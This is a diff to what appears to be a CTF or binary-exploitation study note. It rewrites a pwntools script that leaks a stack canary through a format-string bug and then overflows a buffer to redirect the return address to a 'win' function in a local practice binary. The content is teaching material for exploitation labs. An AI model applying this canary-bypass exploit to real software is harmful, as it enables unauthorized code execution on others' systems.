@@ -63,29 +63,38 @@ p = process('./binary')
 
 # Brute-force which argument index holds the canary
 # Canary is on the stack, looks like 0x????????00 (always ends in \x00)
+p.recvuntil(b"input: ")           # see whatever it prints before reading input
 p.sendline(b"%p " * 20)           # leak 20 stack values
-print(p.recvall())                 # find the one ending in 00
+print(p.recvall())                # find the one ending in 00 - that's the canary
 ```
 
-Step 2: Once you know the index (e.g. 7), leak it directly:
+Full Exploit (hardcode the index):
 ```python
-p.sendline(b"%7$p")               # leak canary as hex
-leak = int(p.recvline().strip(), 16)      # parse it
-canary = leak
-```
+from pwn import *
 
-Then build payload:
-```python
-offset_to_canary = 40             # cyclic to find distance from buffer start to canary
-offset_to_ret    = offset_to_canary + 8 + 8   # canary + saved RBP
+p = process('./binary')
+win = 0xdeadbeef                 # from GDB: p win  OR  info functions
 
-payload  = b"A" * offset_to_canary
-payload += p64(canary)            # restore canary exactly
-payload += b"B" * 8              # overwrite saved RBP (junk)
-payload += p64(win)               # overwrite return address
+# --- Leak canary ---
+p.recvuntil(b"input: ")                  # wait for binary to ask for input before sending anything
+p.sendline(b"%7$p")                      # %<index>$p = leak one specific stack value by position
+                                         # replace 7 with whatever index you found in step 1
+p.recvuntil(b"output: ")                 # wait for binary to print the leak — match whatever comes before the value
+canary = int(p.recvline().strip(), 16)   # recvline() grabs the hex string, int(...,16) converts to integer
+print(f"Canary: {hex(canary)}")          # sanity check — should end in 00
 
+
+# --- Build payload ---
+offset_to_canary = 40            # number of bytes from buffer start to where canary sits — from GDB/cyclic
+
+payload  = b"A" * offset_to_canary   # junk to reach the canary position
+payload += p64(canary)               # write canary back exactly as it was — check passes, no abort
+payload += b"B" * 8                  # overwrite saved RBP — we don't care what this is
+payload += p64(win)                  # overwrite return address — function returns here instead
+
+p.recvuntil(b"input: ")          # binary asks for input again — wait for it before sending payload
 p.sendline(payload)
-p.interactive()
+p.interactive()                  # hand control to us — type commands if we got a shell
 ```
 
 ### <span style="color:rgb(255, 192, 0)">Method 2 — Off-by-One / Partial Overwrite Leak</span>
